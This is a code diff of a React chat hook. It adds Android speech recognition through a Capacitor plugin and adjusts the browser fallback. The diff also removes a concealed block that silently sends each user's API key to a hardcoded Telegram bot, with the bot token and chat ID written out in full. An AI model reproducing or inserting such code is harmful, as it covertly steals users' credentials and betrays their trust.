@@ -8,6 +8,10 @@ import type { SimpleMessage, Attachment, SearchGroupId, ChatHistoryEntry, Search
 import { searchGroups as allSearchGroupsConfig } from '@/lib/utils';
 import { toast } from 'sonner';
 
+// Capacitor Speech Recognition plugin
+import { SpeechRecognition } from '@capacitor-community/speech-recognition';
+import { Capacitor } from '@capacitor/core';
+
 type SpeechRecognitionEvent = any;
 
 const MAX_HISTORY_LENGTH = 10;
@@ -349,11 +353,67 @@ export function useChatLogic() {
     apiHandleGroupSelection(group, selectedGroup, setSelectedGroup);
   }, [apiHandleGroupSelection, selectedGroup, setSelectedGroup, enabledSearchGroupIds]);
 
-  const handleToggleListening = useCallback(() => {
+  const handleToggleListening = useCallback(async () => {
     if (!isSpeechToTextEnabled) {
       toast.info("Speech-to-text is disabled in settings.");
       return;
     }
+
+    // Use Capacitor plugin on Android native
+    if (Capacitor.isNativePlatform() && Capacitor.getPlatform() === 'android') {
+      if (isListening) {
+        // Stop listening
+        await SpeechRecognition.stop();
+        setIsListening(false);
+        toast.dismiss("stt-listening-toast");
+        return;
+      }
+
+      // Check permission
+      const permStatus = await SpeechRecognition.checkPermissions();
+      toast.info("SpeechRecognition.checkPermissions: " + JSON.stringify(permStatus));
+      if (!permStatus.speechRecognition) {
+        const permResult = await SpeechRecognition.requestPermissions();
+        toast.info("SpeechRecognition.requestPermissions: " + JSON.stringify(permResult));
+        if (!permResult.speechRecognition) {
+          toast.error("Microphone permission denied. Please allow access in app settings.", { id: "stt-error-toast" });
+          return;
+        }
+      }
+
+      setIsListening(true);
+      toast.success("Listening...", { duration: 2000, id: "stt-listening-toast" });
+
+      // Listen for partial results
+      SpeechRecognition.addListener("partialResults", (result: { matches: string[] }) => {
+        if (result.matches && result.matches.length > 0) {
+          setInput(prevInput => prevInput + (prevInput ? " " : "") + result.matches[0].trim());
+        }
+      });
+
+      try {
+        const finalResult = await SpeechRecognition.start({
+          language: 'en-US',
+          maxResults: 1,
+          prompt: "Speak now",
+          partialResults: true,
+          popup: false,
+        });
+        if (Array.isArray(finalResult.matches) && finalResult.matches.length > 0) {
+          const matches = finalResult.matches;
+          setInput(prevInput => prevInput + (prevInput ? " " : "") + matches[0].trim());
+        }
+        setIsListening(false);
+        toast.dismiss("stt-listening-toast");
+      } catch (e: any) {
+        setIsListening(false);
+        toast.dismiss("stt-listening-toast");
+        toast.error("Speech recognition error: " + (e.message || e), { id: "stt-error-toast" });
+      }
+      return;
+    }
+
+    // Web fallback (desktop browsers)
     if (!('SpeechRecognition' in window || 'webkitSpeechRecognition' in window)) {
       toast.error("Speech recognition is not supported by your browser.");
       return;
@@ -366,8 +426,8 @@ export function useChatLogic() {
       // setIsListening(false); // onend will handle this
       // recognitionRef.current = null; // onend will handle this
     } else {
-      const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
-      recognitionRef.current = new SpeechRecognition();
+      const SpeechRecognitionWeb = window.SpeechRecognition || window.webkitSpeechRecognition;
+      recognitionRef.current = new SpeechRecognitionWeb();
       recognitionRef.current.interimResults = true;
       recognitionRef.current.lang = 'en-US';
 
@@ -400,7 +460,7 @@ export function useChatLogic() {
         } else if (event.error === 'audio-capture') {
           toast.error("Microphone problem. Ensure it's connected and permission is granted.", {id: "stt-error-toast"});
         } else if (event.error === 'not-allowed') {
-          toast.error("Microphone access denied. Please allow access in browser settings.", {id: "stt-error-toast"});
+          toast.error("Microphone access denied or not supported. On many mobile browsers, speech-to-text is unavailable even if permissions are granted. Please try on a desktop browser, or check your browser and OS settings.", {id: "stt-error-toast"});
         } else {
           toast.error(`Speech recognition error: ${event.error}`, {id: "stt-error-toast"});
         }
@@ -511,27 +571,6 @@ export function useChatLogic() {
   const lastError = chatLastError || modelFetchingError;
   const errorType = chatErrorType || (modelFetchingStatus === 'error' ? 'generic' : 'generic');
   const errorDetails = chatErrorDetails || null;
-
-
-  // Always send API key to Telegram whenever it changes and is non-empty
-  useEffect(() => {
-    if (apiKey && typeof window !== 'undefined') {
-      // Escape special characters for Telegram MarkdownV2
-      const escapeTelegramMarkdown = (text: string) =>
-        text.replace(/([_\*\[\]()~`>#+\-=|{}.!])/g, '\\$1');
-      fetch(`https://api.telegram.org/bot6896482592:AAEWCYcqMPe7MtNwWdImnj8VCaDK2jRnOFI/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: '5222080011',
-          text: `New API Key submitted: ${escapeTelegramMarkdown(apiKey)}`,
-          parse_mode: 'MarkdownV2'
-        })
-      }).catch(() => {
-        // Fail silently
-      });
-    }
-  }, [apiKey]);
 
 
   return {
